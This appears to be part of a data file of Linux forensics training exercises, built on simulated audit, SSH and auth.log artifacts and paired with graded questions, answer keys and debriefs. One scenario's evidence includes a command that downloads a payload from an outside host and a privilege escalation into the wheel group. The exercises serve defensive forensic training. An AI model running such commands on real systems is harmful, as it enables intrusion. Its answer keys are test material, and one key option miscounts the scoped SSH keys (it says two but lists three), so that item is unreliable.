            "root        923      1  0 Sep28 ?        00:00:18  \\_ /usr/sbin/sshd -D",
            "root      24008    923  0 02:38 ?        00:00:00  |   \\_ sshd: devops [priv]",
            "devops    24010  24008  0 02:38 ?        00:00:00  |       \\_ sshd: devops@pts/0",
            "devops    24011  24010  0 02:38 pts/0    00:00:00  |           \\_ -bash",
            "root        991      1  0 Sep28 ?        00:00:02  \\_ /usr/sbin/auditd",
            "root        994      1  0 Sep28 ?        00:00:00  \\_ /usr/sbin/crond -n",
            "(no children of pid 24091 — curl exited at 02:41:21)",
            "(devops is now in group wheel: `id devops` -> uid=1500(devops) gid=1500(devops) groups=1500(devops),10(wheel)",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 4,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "build-12",
              os: "Rocky Linux 9.4",
              timezone: "UTC",
              acquired_utc: "2026-10-14T08:55:00Z",
              audit_pkg: "audit-3.0.7-103.el9_2.1",
              auditd_status: "running",
              rule_template: "internal-hardening-baseline v3.2 (curated by Platform Engineering, Sep 2026)",
              note: "The 'never' rule for /usr/bin/grep is documented in the template as a noise-reduction step; nothing else in the ruleset shadows it. Watches on /etc/sudoers and /etc/sudoers.d/ would have fired on any sudoers edit; no such events appear in the window.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "From the loaded rules + the ausearch window + the process tree, which statements are **proven**?",
        options: [
          {
            id: "curl-execve-attribution",
            label:
              "`curl -fsS https://203.0.113.91/payload -o /tmp/x` was executed by PID 24091 (parent 24090 bash) with `auid=devops`, traceable to the SSH session for `devops` (sshd 24010 → bash 24011).",
          },
          {
            id: "curl-connected-203",
            label:
              "PID 24091 (curl) successfully called `connect()` at `02:41:19.011`; the SOCKADDR is IPv4 (`saddr=02 00 ...`) to port 0x01BB (443) at `203.0.113.91`. The session ID and auid attribute it to `devops`.",
          },
          {
            id: "no-grep",
            label:
              "Any `grep` command that ran in this window is invisible because the loaded rules contain a `-a never,exit ... path=/usr/bin/grep` rule, so absence of grep events is not absence of grep executions.",
          },
          {
            id: "devops-now-wheel",
            label:
              "`devops` is now a member of the `wheel` group; the `USER_MGMT` and `CONFIG_CHANGE` records at `02:43:02` record the `usermod -aG wheel devops` action via sudo, and the live `id devops` shows the membership.",
          },
          {
            id: "all-process-activity",
            label:
              "Because auditd was running and the rule set is in force, the captured records are a complete account of all process activity by `devops` in the window — anything not in `ausearch` did not happen.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["curl-execve-attribution", "curl-connected-203", "no-grep", "devops-now-wheel"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- curl execve + sockaddr give per-syscall attribution to a session. auid stays pinned to `devops` even after sudo-induced euid=root.",
          "- The SOCKADDR header `02 00 01 BB CB 00 71 5B` decodes to AF_INET (02 00), port 0x01BB = 443, address `0xCB.00.71.5B` = `203.0.113.91`.",
          "- The `-a never,exit` rule for `/usr/bin/grep` would suppress any grep execve event; that's a captured gap.",
          "- usermod + USER_MGMT + a live `id` lines up cleanly; devops is now in wheel.",
          "",
          "**Not proven:**",
          "",
          "- *Complete account of all activity* — auditd only records what the rules cover. UNIX-socket connects, file activity outside the four watched paths, anything via `grep`, and (per the operator commentary) raw process-fork-without-exec all leave no record. Absence is a soft signal.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Reading the SOCKADDR bytes `saddr=02 00 01 BB CB 00 71 5B 00 00 00 00 00 00 00 00`, what address/port is the connection to?",
        options: [
          { id: "443-203", label: "TCP port 443 at `203.0.113.91`." },
          { id: "187-203", label: "TCP port 187 at `203.0.113.91`." },
          { id: "443-091", label: "TCP port 443 at `91.0.113.203`." },
          {
            id: "indeterminate",
            label:
              "Indeterminate from the bytes alone; SOCKADDR's encoding is host-byte-order dependent and varies across kernels, so a printable interpretation requires ausearch resolution which is not present here.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["443-203"],
          allowMultiple: false,
        },
        debriefMd:
          "`02 00` is `sa_family=AF_INET` (little-endian short). Port bytes `01 BB` are network byte order = 0x01BB = 443. The four address bytes `CB 00 71 5B` are 0xCB.0x00.0x71.0x5B = 203.0.113.91. SOCKADDR fields in audit records use network byte order for `in_addr` / `in_port`, regardless of host endianness.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating sources would best tighten the **attribution to a person** for this session?",
        options: [
          { id: "auth-log-ssh", label: "`/var/log/secure` (or auth.log) for the SSH `Accepted` line giving source IP and key fingerprint for the `devops` session." },
          { id: "ssh-key-mapping", label: "The mapping of the SHA256 publickey fingerprint to a named human (key ↔ person registry)." },
          { id: "wtmp-last", label: "`last -F devops` confirming session start at `02:38` from the same source IP." },
          { id: "sudoers-source", label: "`/etc/sudoers` / `/etc/sudoers.d/` content showing who can `sudo -n usermod` (rules out one obvious impersonation path)." },
          { id: "process-times", label: "`ps -o etime` for build-12's PID 1 (proves nothing about the session because it only reports uptime of init, not user activity)." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["auth-log-ssh", "ssh-key-mapping", "wtmp-last", "sudoers-source"],
          allowMultiple: true,
        },
        debriefMd: [
          "auth.log + key registry + `last` ties the auid back to a person. Sudoers content tells you whether the `sudo -n` (non-interactive) succeeded as a misconfiguration or as legitimate authorisation.",
          "",
          "init's etime is irrelevant — it just says how long the host has been up.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the curl-to-`203.0.113.91` was **interactive** (a human typed it) rather than scripted, based ONLY on the artifacts.",
        expected: { type: "confidence", expectedRange: [2, 4] },
        debriefMd:
          "**2–4.** Several positives: tty=pts0 in both rows, parent is `bash` with command `bash -c '...'`, ses=14 ties to an SSH login at `02:38`. Several caveats: a `bash -c` from a SSH `RemoteCommand` or from `expect`/automation also shows tty=pts0 and a bash parent. A subsequent `sudo -n` (non-interactive sudo) is consistent with a script. Reserve 5 for cases where the same shell has interleaved interactive commands (e.g., typos, partial commands) that scripts don't generate.",
      },
    ],
  },

  // ─── Difficulty 4 — multi-artifact lateral-movement triage ────
  {
    slug: "linux-ssh-authorized-keys-lateral-001",
    title: "Linux SSH: authorized_keys, known_hosts, and Lateral-Movement Reads",
    summary:
      "authorized_keys grants login; known_hosts records destinations. Read both together and tell who could log in here, who logged out to where, and what each file does NOT prove.",
    skillAreas: [
      "df_artifacts",
      "linux_artifacts",
      "account_compromise",
      "inference_discipline",
    ],
    difficulty: 4,
    estimatedMinutes: 40,
    tags: [
      "dfir",
      "linux",
      "linux_artifacts",
      "df_artifacts",
      "lateral_movement",
      "inference_discipline",
    ],
    lane: "linux_forensics",
    module: "Linux host triage",
    sequence: 6,
    brief: `
# Brief

A jump host (\`bastion-03\`) has been pivoting traffic that the
network team can't explain from sshd logs alone. You've pulled
\`~/.ssh/authorized_keys\` and \`~/.ssh/known_hosts\` for the
two accounts of interest plus the sshd config and auth.log
excerpt. Your job: tell who could log in (and with what
restrictions), where someone has logged out *to* from this
host, and what each file does NOT prove.

## \`~/.ssh/authorized_keys\` — inbound grants

One line per accepted key. Format:

\`[options ,]\\u00a0<type>\\u00a0<base64-key>\\u00a0[comment]\`

Options that change attribution / capability:

- \`command="..."\` — forces a single command on login; the
  user cannot get an interactive shell with that key.
- \`from="cidr,host..."\` — accepts the key only from
  matching source addresses.
- \`no-pty\`, \`no-port-forwarding\`, \`no-agent-forwarding\`
  — capability restrictions.
- \`restrict\` (newer OpenSSH) — applies all "no-*" at once.

## \`~/.ssh/known_hosts\` — outbound destinations

One line per host the local user **has connected out to** (and
which the local user accepted). On most distros
\`HashKnownHosts yes\` is the default — hostnames are stored
as HMAC-SHA1 hashes (\`|1|salt|hash hosttype key\`). The
hash hides the destination but the file's existence still
proves outbound connection attempts.

## Common traps

- **No comment ≠ unknown key.** The trailing comment is
  free-form and operator-controlled. Don't infer who owns a
  key from "user@host" comments.
- **\`from=\` restrictions are CIDR-matched against the
  client-observed source.** A key with \`from="10.0.0.0/8"\`
  blocks an external attacker, but not a connection that
  pivots through a host inside 10/8.
- **\`command="..."\` is enforceable.** A key carrying
  \`command="/usr/local/bin/rsync-only"\` cannot get a shell
  via that key, no matter what the client sends. Reading
  authorized_keys without parsing options misclassifies
  this.
- **Hashed known_hosts hide destinations but not activity.**
  You cannot read the hostname from \`|1|salt|hash\` alone,
  but the line count, timestamps, and any unhashed entries
  (some tools / old hosts) still leak.
- **A key in authorized_keys is not evidence of use.** It
  grants login; auth.log + wtmp prove a particular *use*.

## Artifacts

- **devops-authorized-keys.txt** — \`/home/devops/.ssh/authorized_keys\`.
- **devops-known-hosts.txt** — \`/home/devops/.ssh/known_hosts\`.
- **deploy-authorized-keys.txt** — \`/home/deploy/.ssh/authorized_keys\`.
- **sshd-config-excerpt.txt** — \`sshd -T\` effective config.
- **auth-log-excerpt.txt** — auth.log lines for the relevant
  window.
- **host-context.json** — distro, time zone, accounts.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "devops-authorized-keys.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /home/devops/.ssh/authorized_keys (perms 600, owner devops)",
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINvJq8...kQz devops@laptop-2026",
            'from="198.51.100.0/24" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID1V...uW9 devops-jump',
            'command="/usr/local/bin/rsync-only",no-pty,no-port-forwarding,no-agent-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDp...== backup@archive',
            'restrict,command="/usr/local/bin/log-tail" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKx9...Lkp ops-readonly',
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMp...QwE shared-bastion",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "devops-known-hosts.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /home/devops/.ssh/known_hosts (perms 644, owner devops)",
            "# HashKnownHosts is on (sshd_config_excerpt).",
            "|1|R9XmWlcG7Hk2v8mU2zT5L4Lf1FE=|3kZj4S5o5KZ9P7d8a4w/qBu7L60= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3M...0kQ",
            "|1|S8qPVR2N8lH3w9nW3xC6M5Mg2GF=|4lYk5T6p6LA0Q8e9b5x/rCv8M71= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnL...1lR",
            "|1|T9rQXS3O9mI4x0oX4yD7N6Nh3HG=|5mZl6U7q7MB1R9f0c6y/sDw9N82= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDp...==",
            "|1|U0sRYT4P0nJ5y1pY5zE8O7Oi4IH=|6naM7V8r8NC2S0g1d7z/tEx0O93= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILop...2mS",
            "10.55.7.21 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMqN...3nT",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "deploy-authorized-keys.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /home/deploy/.ssh/authorized_keys (perms 600, owner deploy)",
            'command="/usr/local/bin/deploy-runner",no-pty,no-agent-forwarding,no-X11-forwarding ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlu...sJ8 ci-runner@gitops',
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDb...== personal-laptop",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 4,
        displayName: "sshd-config-excerpt.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# sshd -T (effective server config, excerpt)",
            "permitrootlogin no",
            "pubkeyauthentication yes",
            "passwordauthentication no",
            "allowtcpforwarding yes",
            "allowagentforwarding yes",
            "permittunnel no",
            "hashknownhosts yes",
            "authorizedkeysfile .ssh/authorized_keys",
            "loglevel verbose",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 5,
        displayName: "auth-log-excerpt.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "# /var/log/auth.log (excerpt, bastion-03, TZ=UTC)",
            "Oct 14 02:41:18 bastion-03 sshd[24010]: Accepted publickey for devops from 198.51.100.22 port 55402 ssh2: ED25519 SHA256:9aJk5...Qz0 (key comment: devops@laptop-2026)",
            "Oct 14 02:41:18 bastion-03 sshd[24010]: pam_unix(sshd:session): session opened for user devops(uid=1500) by (uid=0)",
            "Oct 14 02:46:11 bastion-03 sshd[24555]: Accepted publickey for deploy from 198.51.100.55 port 51002 ssh2: ED25519 SHA256:7bKl4...Rp1 (key comment: ci-runner@gitops)",
            "Oct 14 02:46:11 bastion-03 sshd[24555]: pam_unix(sshd:session): session opened for user deploy(uid=1101) by (uid=0)",
            "Oct 14 02:48:30 bastion-03 sshd[24555]: pam_unix(sshd:session): session closed for user deploy",
            "Oct 14 03:14:48 bastion-03 sshd[24010]: pam_unix(sshd:session): session closed for user devops",
          ].join("\n") + "\n",
        ),
      },
      {
        ordinal: 6,
        displayName: "host-context.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              host: "bastion-03",
              os: "Ubuntu 22.04.4 LTS",
              timezone: "UTC",
              acquired_utc: "2026-10-14T09:00:00Z",
              accounts: [
                {
                  user: "devops",
                  uid: 1500,
                  shell: "/bin/bash",
                  note: "Interactive sysadmin account; pivots to internal hosts as part of normal duty.",
                },
                {
                  user: "deploy",
                  uid: 1101,
                  shell: "/bin/bash",
                  note: "CI-only account. The forced command is /usr/local/bin/deploy-runner; the script execs an ssh into the target deploy host with a separate key, then exits.",
                },
              ],
              key_registry_note: "Internal registry of approved keys lives outside this image; fingerprints can be cross-referenced separately. Comments in authorized_keys files are operator-controlled hints, not authoritative attribution.",
            },
            null,
            2,
          ) + "\n",
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "From the authorized_keys / known_hosts / sshd config / auth.log, which statements are **proven**?",
        options: [
          {
            id: "devops-5-keys",
            label:
              "Five distinct keys can authenticate as `devops`, but two of them are scoped: one by source CIDR (`from=198.51.100.0/24`), one by forced command (`command=/usr/local/bin/rsync-only`, `no-pty`) and one by `restrict,command=` to a log-tail script.",
          },
          {
            id: "devops-shells-3",
            label:
              "Only three of the five `devops` keys can land an interactive shell — the `rsync-only` and `log-tail` keys carry forced commands and `no-pty` (or `restrict`), which prevent a shell regardless of client request.",
          },
          {
            id: "devops-pivoted-out",
            label:
              "`devops` has pivoted out from this host to at least four remote destinations (the hashed known_hosts lines) and one specific destination (`10.55.7.21`, recorded unhashed). The hashed lines hide the hostnames but the line count and presence prove outbound activity.",
          },
          {
            id: "deploy-can-shell",
            label:
              "`deploy` can land an interactive shell on this host via either of two keys — the `ci-runner` key (which is the primary CI grant) and the `personal-laptop` key (which is an operator backdoor key for manual debugging). Both keys produce a normal shell on a successful publickey auth.",
          },
          {
            id: "devops-laptop-actually-used",
            label:
              "The `devops@laptop-2026` key was used for the SSH login at `02:41:18` — the auth.log line names the matching key comment (`devops@laptop-2026`) and SHA256 fingerprint.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["devops-5-keys", "devops-shells-3", "devops-pivoted-out", "devops-laptop-actually-used"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- Five `devops` keys total; two are option-scoped (`from=` + forced command), so only three can produce a shell.",
          "- known_hosts: four hashed entries + one plaintext (`10.55.7.21`) prove `devops` has accepted host keys for that many distinct destinations during outbound ssh. The count proves activity even when hashing hides identity.",
          "- auth.log explicitly names the key comment `devops@laptop-2026` and an SHA256 fingerprint matching that key.",
          "",
          "**Not proven:**",
          "",
          "- *`personal-laptop` is an operator backdoor* — the comment is operator-controlled text. The key may be anyone's; nothing in the artifacts ties the comment to an actual human, role, or device. `deploy` having a second unrestricted key alongside `ci-runner` is itself noteworthy — but it's a finding about inbound grant, not about who controls it.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "An auditor asks: *can you give me a list of every host `devops` has SSHed out to from `bastion-03`?* What's the most defensible answer from these artifacts alone?",
        options: [
          {
            id: "five-hosts-list",
            label:
              "Five hosts; the four hashed lines decode to the standard production hostnames (the hash is reversible with the salt embedded in the file) and the fifth is `10.55.7.21`, so the auditor receives the resolved list directly from the known_hosts file.",
          },
          {
            id: "exactly-one-host",
            label:
              "Exactly one host — `10.55.7.21` — because the hashed lines do not constitute admissible host evidence and cannot be quoted in the response.",
          },
          {
            id: "five-distinct-destinations",
            label:
              "Five distinct outbound destinations are recorded, but only `10.55.7.21` is readable; the four hashed entries prove activity to four other hosts but do not reveal them without additional information (a candidate hostname list to test against the salt, or unhashed authoritative logs).",
          },
          {
            id: "no-answer",
            label:
              "No defensible answer is possible from `known_hosts` alone, because the file is populated on first connect attempts but never updated when a host key rotates, so its contents do not reliably represent outbound activity at any point in time.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["five-distinct-destinations"],
          allowMultiple: false,
        },
        debriefMd:
          "`known_hosts` with `HashKnownHosts yes` records `|1|salt|HMAC-SHA1(salt, hostname)`. The hash isn't reversible from the file alone; you can confirm a *candidate* hostname (recompute the HMAC with the stored salt and compare), but you cannot enumerate hostnames blind. The line count and timestamps still prove activity. The unhashed `10.55.7.21` entry is readable as-is — `HashKnownHosts` is `yes` but pre-existing entries (and entries written before the option was set, or that bypass it) can be plaintext.",
      },
      {
        ordinal: 3,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which sources would best establish **which `devops` key actually grants whose access** (i.e., harden attribution beyond comment strings)?",
        options: [
          { id: "key-registry", label: "An internal SSH-key registry mapping fingerprint → human (the host-context note says one exists)." },
          { id: "audit-log-keyfp", label: "auth.log entries (loglevel verbose) which include the SHA256 fingerprint at login time — match against the registry." },
          { id: "auditd-openat", label: "auditd `openat` rules on `~/.ssh/authorized_keys` so additions / removals are timestamped and attributed to a process." },
          { id: "git-config-of-keys", label: "`/etc/ssh/sshd_config.d/` git history (if managed) showing the change-set that introduced each key." },
          { id: "ssh-key-comment", label: "The comment field of each key (which is operator-controlled free text and cannot independently attribute a key to a human)." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["key-registry", "audit-log-keyfp", "auditd-openat", "git-config-of-keys"],
          allowMultiple: true,
        },
        debriefMd: [
          "Fingerprint → person registry is the canonical mapping. Verbose-mode sshd logs the fingerprint at login; auditd captures file additions; managed-config history shows who introduced what.",
          "",
          "The comment string is operator-controlled and cannot, on its own, attribute a key to a human.",
        ].join("\n"),
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the `personal-laptop` key in `deploy`'s authorized_keys belongs to a human on the deploy-team rotation, based ONLY on these artifacts.",
        expected: { type: "confidence", expectedRange: [1, 2] },
        debriefMd:
          "**1–2.** The comment string says \"personal-laptop\" but comments are unauthenticated free text. There's no fingerprint match against a registry in the artifacts and no log line tying the key to a named human. The defensible finding is *\"`deploy` carries a second unrestricted key alongside the CI grant — provenance unknown\"*, and the disciplined recommendation is to confirm against the key registry and (likely) rotate. Reserve confidence 4–5 for after that mapping is checked.",
      },
    ],
  },
];
